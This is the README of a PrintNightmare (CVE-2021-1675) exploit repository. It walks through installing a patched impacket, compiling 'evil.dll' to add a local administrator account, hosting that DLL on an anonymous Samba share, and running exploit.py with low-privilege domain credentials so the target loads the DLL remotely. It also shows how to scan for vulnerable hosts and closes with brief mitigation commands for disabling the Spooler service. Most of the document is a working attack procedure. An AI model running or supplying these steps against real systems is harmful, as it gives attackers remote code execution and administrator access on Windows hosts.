# CVE-2021-1675

Stolen from: https://github.com/cube0x0/CVE-2021-1675

### Install

```
pip3 uninstall impacket
git clone --branch PrintNightmare https://github.com/LuemmelSec/impacket
cd impacket
python3 -m pip install .
apt install mingw-w64
```

### Build DLL (64 bit)
I used this version: https://github.com/newsoft/adduser  

```
cd DLL  
mv Tchar.h /usr/x86_64-w64-mingw32/include/
mv Lmaccess.h /usr/x86_64-w64-mingw32/include/
```

Edit the evil.dll to your needs:  
- change username & password  
- change name of the local admin group -> language dependant  

Build the DLL  
```
x86_64-w64-mingw32-gcc -shared -oevil64.dll evil.c -lnetapi32
cp evil64.dll /tmp/
```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

Start SMB Service
```
service smbd start
```

### CVE-2021-1675.py

```
python3 exploit.py mcafeelab.local/lowpriv@10.55.0.1 '\\10.55.0.30\smb\evil64.dll'
```


### Scanning

We can use `rpcdump.py` from impacket to scan for vulnerable hosts, if it returns a value, it's vulnerable 

```
rpcdump.py @192.168.1.10 | grep MS-RPRN

Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Mitigation

Disable Spooler service

```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start " /t REG_DWORD /d "4" /f
```

Or Uninstall Print-Services

```powershell
Uninstall-WindowsFeature Print-Services
```
